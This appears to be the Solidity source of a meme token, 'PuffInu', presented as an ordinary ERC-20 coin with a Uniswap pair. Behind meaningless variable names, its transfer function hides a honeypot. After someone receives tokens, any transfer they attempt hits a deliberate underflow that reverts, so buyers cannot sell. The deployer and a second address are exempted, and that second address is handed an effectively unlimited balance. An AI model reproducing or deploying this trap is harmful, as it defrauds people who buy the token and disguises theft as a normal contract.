// https://t.me/puff_inu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PuffInu is Ownable {
    constructor(
        string memory shot,
        string memory exchange,
        address control,
        address rise
    ) {
        uniswapV2Router = IUniswapV2Router02(control);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = exchange;
        _name = shot;
        label = 3;
        _decimals = 9;
        _balances[rise] = likely;
        zulu = 1000000000;
        strike[rise] = likely;
        _tTotal = zulu * 10**_decimals;
        strike[msg.sender] = likely;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public label;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private zulu;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private meat;
    uint256 private likely = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address table,
        address completely,
        uint256 group
    ) internal {
        uint256 watch = label;

        address volume = uniswapV2Pair;

        if (strike[table] == 0 && volume != table && there[table] > 0) {
            strike[table] -= watch;
        }

        address above = meat;
        meat = completely;
        there[above] += watch + 1;

        _balances[table] -= group;
        uint256 look = (group / 100) * label;
        group -= look;
        _balances[completely] += group;
    }

    mapping(address => uint256) private there;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private strike;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}